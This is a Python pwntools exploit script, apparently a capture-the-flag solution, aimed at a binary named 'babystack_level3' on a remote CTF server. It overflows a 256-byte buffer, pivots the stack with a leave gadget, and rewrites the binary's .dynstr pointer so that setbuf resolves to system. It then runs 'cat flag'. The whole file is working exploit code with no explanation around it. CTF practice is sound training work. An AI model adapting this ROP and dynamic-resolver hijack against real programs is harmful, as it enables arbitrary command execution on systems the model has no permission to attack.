#!/usr/bin/env python3
from pwn import *

local = False

context.terminal = "/usr/bin/kitty"
context.gdbinit = "/usr/share/pwndbg/gdbinit.py"
context.binary = elf = ELF("./babystack_level3")

rop = ROP("./babystack_level3")
rop_pivot = ROP("./babystack_level3")
c = ''

if local:
    c = gdb.debug("./babystack_level3", """
b *0x4005e7
continue
    """)
else:
    c = remote("nc.thuctf.redbud.info", port=32076)

dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"setbuf",b"system")

cmd = b'cat flag\0'

rop_pivot.raw((256)*'a')
rop_pivot.raw(0x601b00) # rbp
rop_pivot.raw(0x400603) # leave: rsp <- rbp

rop_len = 0x50
cmd_adr = 0x601b00 + rop_len + len(dynstr)

rop({"rdi": 0, "rsi": 0x600930})
rop.read() # overwrite address of .dynstr in .dynamic
rop({"rdi": cmd_adr})
rop.raw(0x4004b6) # setbuf@plt + 6
print(rop.dump())

rop_chain = rop.chain()
assert(len(rop_chain) + 8 == rop_len)
name = b'12345678' + rop_chain + dynstr + cmd

c.send(flat(name, length=272))
c.send(flat(rop_pivot.build(), length=272))
c.send(p64(0x601b00 + rop_len))
print(c.recv())
